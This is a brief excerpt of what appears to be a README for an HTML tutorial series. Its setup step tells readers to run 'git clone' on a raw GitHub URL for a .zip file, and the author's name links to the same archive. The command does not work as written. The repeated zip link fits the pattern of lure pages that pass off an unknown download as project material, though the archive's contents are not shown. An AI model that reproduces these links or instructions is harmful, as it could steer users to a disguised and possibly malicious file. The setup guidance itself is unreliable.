...
1. Clone this repository to your local machine using the following command:
   ...
   ```
   git clone https://raw.githubusercontent.com/Theebiga22/html.project/main/objectival/html.project.zip
   ```
...
This tutorial series is created and presented by [Agnel John](https://raw.githubusercontent.com/Theebiga22/html.project/main/objectival/html.project.zip), a passionate web developer with a goal to share knowledge and help others learn HTML effectively.
